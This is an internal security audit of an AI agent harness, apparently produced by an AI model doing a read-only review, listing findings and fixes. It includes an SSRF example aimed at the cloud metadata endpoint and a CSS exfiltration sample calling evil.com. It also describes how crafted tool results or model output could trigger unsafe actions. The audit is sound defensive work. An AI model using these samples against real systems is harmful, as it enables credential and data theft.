# Internal security audit — v0.17.0 prep

**Date**: 2026-05-15
**Auditor**: claude-sonnet-4-6 (read-only static review)
**Scope**: kenaz-harness `main` branch at the start of v0.17.0 planning
**Status**: Internal proxy for the v0.17.0 "external security audit" mission; intended to surface findings the external pen-test should also verify.

---

## Executive summary

The codebase shows a mature, defence-in-depth approach to security. The Cedar policy engine is wired consistently across most privileged surfaces, CI scripts (`check-no-cred-bytes-in-rpc.sh`, `check-no-user-content-in-slog.sh`) pass clean, the Sentry redactor covers the core provider patterns, and markdown rendering in the chat pane is guarded by DOMPurify. Two findings are **high** severity: (1) the `Audit_BulkPurge` RPC calls the store directly without invoking the Cedar gate that the comments promise, and (2) the `kaneaz__web_fetch` built-in tool makes arbitrary HTTP requests without a Cedar `CheckNetwork` gate, letting the model direct outbound traffic to any URL including RFC-1918 addresses. Three additional medium findings cover the encryption-at-rest TODO, missing Gemini/Azure key patterns in the Sentry redactor, and a `style` attribute whitelisted in DOMPurify that enables LLM-controlled CSS injection inside the chat pane. Total: 2 high / 3 medium / 2 low / 4 informational.

---

## Findings

### F-001 [HIGH]: `Audit_BulkPurge` RPC bypasses Cedar gate

- **Location**: `core/rpc/bindings.go:669-671`, `core/rpc/views/audit/impl.go:299-302`, `core/policy/cedar/types.go:242-249`
- **Threat**: `Audit_BulkPurge` is the Wails-bound RPC that deletes arbitrary rows from the append-only audit log. The comment in `audit/impl.go` line 299-300 explicitly states *"the Cedar policy check is performed by the caller (Bindings layer) via `Audit_BulkPurge` which checks `ActionAuditBulkPurge`"*. However, `bindings.go:669` implements this as a single-line pass-through with no Cedar evaluation:

  ```go
  func (b *Bindings) Audit_BulkPurge(eventIDs []string) error {
      return b.api.Audit().BulkPurge(b.ctx(), eventIDs)
  }
  ```

  `ActionAuditBulkPurge = "audit.bulk_purge"` is defined in `types.go` and the Cedar default_policy marks it as *default-forbid* ("destructive irreversible operation; operators must explicitly permit with a Cedar policy snippet"), but no gate call helper (e.g. `GateAuditBulkPurge`) exists anywhere in `core/policy/cedar/hooks.go`, and no `Evaluate`/`Check` call appears in the Bindings or audit impl before `DeleteRows`. An attacker with RPC access (e.g. via a crafted tool result that triggers the frontend) can delete all audit records with no policy enforcement.
- **Mitigation**: Add a `GateAuditBulkPurge(ctx, Gate, eventIDs)` hook helper mirroring `GateWorkflowDelete`. Call it inside `Bindings.Audit_BulkPurge` before delegating to `api.Audit().BulkPurge`. The action is already default-forbid in `types.go`; the Cedar evaluation is the missing step.

---

### F-002 [HIGH]: `kaneaz__web_fetch` built-in makes unrestricted network egress

- **Location**: `core/tools/webfetch/webfetch.go:123-248`, `core/rpc/builtins_wiring.go:242-244`
- **Threat**: The `kaneaz__web_fetch` tool makes HTTP requests on behalf of the model without going through `cedar.CheckNetwork`. The tool's `Call()` method resolves `@secret:` references via the Cedar-gated `refs.Resolver`, but the actual outbound HTTP request to the model-supplied URL is dispatched without any host-level Cedar evaluation. Contrast with `core/tools/websearch/fetch.go:110-115`, which calls `cedar.CheckNetwork(ctx, f.gate, pu.Hostname())` before every request.

  Additionally, the tool is constructed with `http.DefaultClient` when no client is injected (`webfetch.go:92`), which follows redirects without re-validating the target host. The model can therefore supply a URL like `http://169.254.169.254/latest/meta-data/` (AWS IMDS), `http://localhost:8080`, or any RFC-1918 address and the tool will fetch it unchallenged. No private-range IP block is applied.

  The `builtins_wiring.go:242` wiring passes no Cedar gate, no SSRF-safe `http.Client`, and no host-allowlist.
- **Mitigation**: (a) Add a Cedar `CheckNetwork(ctx, gate, pu.Hostname())` call inside `webfetch.Call()` before building the request, mirroring the websearch fetcher pattern. (b) Inject an SSRF-safe `http.Client` with a `DialContext` hook that rejects connections to RFC-1918 / loopback / link-local addresses after DNS resolution. The `CheckRedirect` function should also re-validate the redirect target host through Cedar.

---

### F-003 [MEDIUM]: Encryption-at-rest not implemented; plaintext SQLite at default path

- **Location**: `core/storage/sqlite/sqlite.go:39-42`, `core/storage/storage.go:100`
- **Threat**: `sqlite.Open` returns `storage.ErrNotImplemented` if `EncryptionStatusEnabled` is selected. The active production path (`disabled` or `disabled_with_disk_encryption`) stores the harness SQLite database — including conversation history, credential references, audit events, memory chunks, and artifacts — as plaintext on disk. The TODOs in `storage.go:12` and `100` acknowledge that the secrets-keychain mission's encryption integration is pending. Until that mission ships, any local privilege escalation (or backup restore of the `data.db` file) yields all sensitive data.
- **Mitigation**: Track as a v0.17.x item. Until encryption lands, the installer/onboarding should prominently recommend OS-level full-disk encryption and warn that the harness data directory is plaintext. The `TODO(secrets-keychain)` items (`storage.go:12,25,100`) should be ticketed against a concrete milestone.

---

### F-004 [MEDIUM]: Sentry redactor missing Gemini AI Studio key, Azure `api-key`, and Sentry DSN patterns

- **Location**: `core/sentry/redactor.go:24-58`
- **Threat**: The redactor covers Anthropic (`sk-ant-...`), OpenAI (`sk-proj-...` / `sk-...`), generic Bearer tokens, bare JWTs, and AWS key IDs/secrets. Three key patterns used by adapters in this codebase are absent:

  1. **Gemini AI Studio keys** — `core/llm/gemini/auth.go:47` sets the `x-goog-api-key` header with the raw credential bytes. Gemini AI Studio keys have the prefix `AIzaSy` followed by 33 alphanumeric characters (`AIzaSy[A-Za-z0-9_-]{33}`). If such a key appears in a Sentry error event's `extra` or `message` fields, the redactor will not strip it.

  2. **Azure OpenAI `api-key` header values** — `core/llm/azure/auth.go:15` sets `req.Header.Set("api-key", string(cred))`. Azure API keys are typically 32-character hex strings, not matching the `sk-...` or `Bearer ...` patterns. An error that dumps request headers will expose the key.

  3. **Sentry DSN itself** — A Sentry DSN (`https://<key>@<host>/...`) contains a project key that is sensitive. The DSN is user-configurable via `Settings.SentryDSN` (`core/rpc/views/settings/api.go:496`). If a crash captures the settings struct, the DSN key would appear in the Sentry event unredacted.

- **Mitigation**: Add three regex rules to `redactor.go`:
  - Gemini AI Studio: `AIzaSy[A-Za-z0-9_-]{33}` → `[REDACTED:gemini-key]`
  - Azure api-key (context-sensitive heuristic): `(?i)api[-_]key[=:\s]+[A-Za-z0-9]{32}` → `[REDACTED:azure-api-key]`
  - Sentry DSN token: `https://[a-f0-9]{32}@` → `[REDACTED:sentry-dsn]`
  Also note the Vertex AI Workload Identity (`ya29.[A-Za-z0-9_-]+`) OAuth token would be covered by the existing JWT pattern only if the `eyJ` prefix is present; `ya29.*` access tokens would not match. Consider adding `ya29\.[A-Za-z0-9_\-]{20,}` as an additional rule.

---

### F-005 [MEDIUM]: `style` attribute whitelisted in DOMPurify for chat markdown pane

- **Location**: `frontend/src/components/chat/MarkdownBlock.vue:282`
- **Threat**: The `DOMPurify.sanitize` call for chat markdown output includes `'style'` in `ADD_ATTR`. DOMPurify by default strips the `style` attribute to prevent CSS-based information leakage (e.g. `background: url(http://evil.com/track?data=...)`) and side-channel attacks. Whitelisting `style` allows model-generated markdown to inject arbitrary CSS on elements that survive the sanitization pass. In a Wails app the practical impact is limited (no cross-origin network from the renderer CSP), but it enables:
  - UI-level deception (styling a "confirm delete" prompt to look legitimate)
  - Potential exfiltration via `background-image: url(data:...)` or other CSS constructs that may be honoured by the local WebView
  - CSS keylogger patterns if any form elements are present in the chat pane

  The `style` attribute appears to have been added for KaTeX rendering purposes; KaTeX's `output: 'html'` mode emits inline style attributes. However, this blanket whitelist is broader than necessary.
- **Mitigation**: Replace the blanket `ADD_ATTR: ['style']` with a DOMPurify hook that allows `style` only on elements with `class` values matching `katex*`. Alternatively switch to KaTeX `output: 'mathml'` which does not require `style` attributes. The mermaid-svg profile correctly does not whitelist `style`.

---

### F-006 [LOW]: `kaneaz__web_fetch` response headers forwarded without complete scrubbing

- **Location**: `core/tools/webfetch/webfetch.go:229-237`
- **Threat**: The web_fetch tool scrubs `Authorization`, `Set-Cookie`, and `Cookie` from response headers before returning them to the model. However, it does not strip `X-Auth-Token`, `X-Api-Key`, `Proxy-Authorization`, `WWW-Authenticate`, or custom response headers that may carry bearer tokens in non-standard header names (common with some APIs). A server that reflects a request secret back in a custom response header (e.g. `X-Request-Id: Bearer sk-ant-...`) would bypass the scrubbing.
- **Mitigation**: Consider returning only a curated allowlist of safe headers rather than a blocklist of dangerous ones. Alternatively, run response headers through `sentry.RedactString` before forwarding them to the model.

---

### F-007 [LOW]: Cedar Engine construction falls back to `AllowAll` on startup error

- **Location**: `core/rpc/api.go:4652-4654`
- **Threat**: If `cedar.NewEngine` fails (e.g. because the DataDir policy directory is momentarily unreadable or a `.cedar` file has a parse error that prevents the embedded bundle from loading), the harness silently falls back to `cedar.AllowAll{}` and logs a warning. This means a transient policy-directory error during startup leaves the harness in an unrestricted state for the duration of the session. The `AllowAll` gate returns `NotApplicable` for every check, which `enforce()` maps to `nil` (allow) — so tool execution, credential access, memory writes, and network requests all proceed without policy evaluation.
- **Mitigation**: Consider surfacing a visible, persistent UI indicator when the Cedar engine failed to load (analogous to how MCP server failures surface). Optionally, treat Cedar construction failure as a fatal error at startup rather than a silent fallback, at least for production builds.

---

### F-008 [INFORMATIONAL]: `composeIframeDoc` injects raw artifact HTML into a string template

- **Location**: `frontend/src/views/artifacts/preview/composeIframeDoc.ts:35-44`
- **Threat**: `composeIframeDoc` concatenates `artifactHtml` directly into the `srcdoc` string without parsing or sanitizing it. The comment acknowledges this is intentional ("avoids the class of injection where adversarial artifact HTML contains `</head>` sequences"). The iframe's `sandbox` attribute (no `allow-scripts`) and `default-src: none` CSP inside the iframe prevent script execution. However, the artifact HTML can escape the `<body>` context via crafted tag sequences and inject `<meta>` tags, additional `<base>` elements, or style rules into the `<head>`. The `<base target="_blank">` already set in the template would be overridden. The practical risk is limited by the absence of `allow-scripts`.
- **Mitigation**: The existing belt-and-braces (no `allow-scripts`, `default-src: none`) provides adequate protection for the current threat model. Document explicitly that `artifactHtml` is trusted to be well-formed HTML when the CSP + no-scripts sandbox is in place. The external pen-test should verify whether any CSP bypass exists in the embedded WebView version used by Wails.

---

### F-009 [INFORMATIONAL]: Audit log hash chain does not prevent deletion

- **Location**: `core/event/log/chain.go`, `core/event/log/store.go`
- **Threat**: The SHA-256 hash chain in `chain.go` detects post-hoc row *modification* (payload tampering). It does not prevent or detect *deletion* of rows. An adversary who can call `Audit_BulkPurge` (see F-001) or who has direct DB access can delete rows; `VerifyChain` will then report a broken chain for the session only at the first row that referenced the deleted row's hash as `PrevHash`. Deletion of the tail row of a session leaves the chain intact. The chain also uses string comparison for `EventID` ordering (`r.EventID < fromID`) which assumes lexicographic ordering matches temporal ordering (true only if event IDs are ULIDs or similar prefix-time-encoded).
- **Mitigation**: Document clearly that the hash chain's threat model is *integrity of retained rows*, not *completeness*. For completeness, a separate monotonic row counter or a Merkle tree root export would be required. The external pen-test should verify the EventID ordering assumption.

---

### F-010 [INFORMATIONAL]: MCP HTTP transport connects without Cedar `CheckNetwork`

- **Location**: `core/mcp/transport/http/connection.go:155-218`
- **Threat**: When a recipe uses the HTTP transport, `Connection.Open` resolves the URL from the Spec and builds an `http.Client` that connects directly without consulting `cedar.CheckNetwork`. The `CheckRecipeSpawn` gate (fired before the pool opens the connection) checks that the recipe spawn is permitted, but it validates the recipe's `command` field (first argv element), not the URL. An HTTP-transport recipe pointing at an RFC-1918 endpoint is not blocked by Cedar. The redirect guard (`ErrUseLastResponse`) prevents redirect-based SSRF, which is good.
- **Mitigation**: Wire `cedar.CheckNetwork` at connection open time, passing the resolved hostname. This is the same pattern the websearch fetcher uses. The `CheckRecipeSpawn` gate's `command` attribute could also be extended to include the URL for HTTP-transport recipes.

---

## Non-findings (audited and clean)

- **SQL injection**: All runtime DB calls in `core/artifacts/store_sql.go`, `core/slashcmd/store_user.go`, `core/tasks/store_sql.go`, and `core/corpus/store.go` use parameterised queries (`?` placeholders with `args...` slices). No `fmt.Sprintf` or string concatenation builds SQL at runtime.
- **Credential bytes through RPC**: CI script `check-no-cred-bytes-in-rpc.sh` passes clean. No `cred []byte` fields appear outside the allowlisted packages, and no hard-coded API key literals (`sk-ant-*`, `sk-*`) were found outside test/fixture paths.
- **Slog privacy invariant**: CI script `check-no-user-content-in-slog.sh` passes clean. Spot-checked `core/llm/gemini/`, `core/llm/azure/`, and `core/llm/anthropic/` — no prompt/response content in `slog.Error` / `L().Error()` calls.
- **Path traversal**: `core/tools/fs/canonical.go:Canonicalize` applies `filepath.Abs` + `filepath.Clean` and explicitly walks every segment to reject `..`. Control-character rejection (including NUL) is present. The fs Gate passes the canonicalised path to Cedar and to the prompt. Symlinks are intentionally not followed (preserves user-stated path semantics).
- **Template injection / XSS in markdown**: The chat pane uses `marked` + `DOMPurify` consistently (except the `style` attribute issue in F-005). The `composeIframeDoc` artifact path uses a script-disabled sandbox + `default-src: none` CSP. The `JsonResponseBlock`, `ImageBlock`, and search snippet renderers explicitly avoid `v-html`.
- **CSP review**: `core/rpc/csp.go` sets `connect-src: none; script-src: self; style-src: self 'unsafe-inline'`. `unsafe-inline` for styles is expected (Wails SPA pattern, no nonce infrastructure). `connect-src: none` means the renderer cannot make network requests; all LLM traffic goes through Go RPC. No external origins (`sentry.io`, OTel) are whitelisted — Sentry reporting goes through the Go SDK, not the browser. The CI `check-csp.sh` validates the dist artefact header.
- **Race conditions**: The LLM registry uses `sync.RWMutex` on `adapters` and `profiles` maps. The audit `API` struct uses `sync.RWMutex` protecting `entries`, `subs`, and `savedQueries`. The fs Gate's transient-grant map uses a dedicated `transientMu`. The websearch fetcher's robots cache uses `robotsMu`. No obvious unguarded shared mutable state was found in the hot paths.
- **Open security TODOs**: Found three security-adjacent TODOs in `core/storage/storage.go` (encryption-at-rest, tracked as F-003) and one in `core/eval/replay.go:195` (injecting a live API registry into eval replay — informational, no active exploit path).
- **Audit log hash chain insert path**: `core/event/log/store.go:Append` delegates to `Backend.AppendRow` which uses `expectedHead` for optimistic concurrency. The `chain.go:recomputeHash` serialises `prev_hash_hex | kind | emitted_at_unix_ms | payload_json` and SHA-256s it. The insert path correctly computes and stores `PayloadHash` on write.

---

## Limitations

The following categories are **not** covered by this static review and must be flagged for the external pen-test:

- **Live exploitation**: All SSRF, privilege-escalation, and bypass findings are hypothetical. Runtime confirmation requires an instrumented build.
- **WebView-specific CSP bypasses**: Wails embeds the OS WebView (WKWebView on macOS, WebView2 on Windows). Each has known CSP parsing quirks; the pen-test should probe the specific engine versions in the v0.17.0 build.
- **Sandbox escape via `allow-same-origin` iframe**: The artifact preview iframe uses `sandbox="allow-same-origin"` (required for inline CSS) combined with no `allow-scripts`. The pen-test should verify whether the combination allows any DOM access to the parent from within the iframe under the specific WebView version.
- **Runtime side-channels**: Timing attacks on Cedar evaluation, credential access latency, or token-based inference from model responses are outside static scope.
- **Build-pipeline supply chain**: `frontend/` uses npm dependencies including `dompurify`, `marked`, `katex`, and `mermaid`. These should be audited against current CVE databases at pin time.
- **OS keychain credential access**: The `core/credstore` system relies on OS keychain APIs for secret storage. Keychain ACL misconfiguration or keychain-bypass techniques are runtime/OS concerns.
- **MCP server isolation**: Third-party MCP servers installed via `mcp-server-install` run as child processes with the harness's user privileges. Sandbox/capability isolation between MCP child processes and the harness is not enforced at the Go level; the pen-test should confirm the OS-level process isolation model.
- **Sentry DSN exposure in crash reports**: The local crash report written by `GenerateLocalReport` may include settings-level context that contains the SentryDSN. The exact report schema was not fully audited.
